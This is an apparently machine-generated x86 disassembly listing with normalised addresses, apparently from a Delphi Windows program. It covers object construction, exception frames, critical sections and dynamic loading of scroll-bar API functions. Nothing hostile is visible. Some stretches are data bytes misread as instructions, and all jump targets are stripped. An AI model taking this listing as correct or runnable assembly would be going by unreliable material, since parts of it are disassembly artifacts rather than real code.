mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
jae r-xdata
dec [ ebx + 0x423444c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_4237cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_423842
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_423958
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_405508
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423849
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238e4
mov [ rw-data ] eax
sub_423850
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238e4
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405534
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_4238a8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_405508
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4238e4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
mov dl 0x1
mov eax [ r-xdata ]
call sub_422794
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422794
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422794
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403eb4
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_423958
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_423a59
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238a8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422844
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4054f0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc90
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4054f0
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc90
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238a8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422844
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4238a8
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_422844
mov ecx r-xdata
call sub_405534
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423a60
lea eax [ ebp - 0xc ]
call sub_4054f0
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
sub edx 0xfffffff8
sub_423a78
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_423ab8
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_423ae8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423c15
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c81
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
mov eax esi
xor edx edx
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_422828
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4030f8
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_422828
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_423c88
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_423d6d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403f08
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d74
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404930
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_422828
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405508
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_422828
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405508
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_423fa4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424097
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403f08
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42409e
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404930
lea eax [ ebp - 0x10 ]
call sub_4054f0
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_422828
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_405508
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_4240bc
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42419b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403f08
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241a2
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404930
lea eax [ ebp - 0x8 ]
call sub_4054f0
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_422828
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_405508
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405534
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4241bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405564
xor eax eax
push ebp
push sub_42420b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_405508
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424212
lea eax [ ebx + 0xc ]
call sub_4054f0
sub_424218
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404364
xor eax eax
push ebp
push sub_4242ad
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403f08
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_423fa4
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242b4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
mov eax ebx
call sub_423ab8
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_423ae8
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_423c88
sub_4242d8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_422828
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_422828
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4138e4
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_422828
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4138e4
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4138e4
sub_424364
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax esi
call sub_423a78
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_4030f8
mov eax [ esi + 0x14 ]
call sub_4030f8
mov eax [ esi + 0x10 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4054f0
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_4243b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4243ef
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243f6
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_424400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424425
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42442c
retn
sub_424438
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424469
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424470
retn
mov eax [ rw-data ]
call sub_4030f8
sub_42447c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_4244b0
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_4244d8
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42475a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424781
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424788
retn
sub_424804
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
dec eax
inc edx
add [ eax + eax ] bl
add [ eax ] al
pushfd
inc edi
inc edx
add [ eax ] ch
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] bh
xor eax [ eax ]
cmp al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
nop
xor [ eax ] al
lodsb [ esi ]
xor [ eax ] al
mov al 0x48
inc edx
add al ah
dec eax
inc edx
add ah ch
dec eax
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
retn
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_424870
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030c8
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax esi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_4248b0
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_424908
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42492d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424934
retn
sub_424940
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push sub_424af7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424afe
mov eax [ rw-data ]
call sub_424900
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_424b00
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_4248f8
xor eax eax
push ebp
push sub_424eb3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424eba
mov eax [ rw-data ]
call sub_424900
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
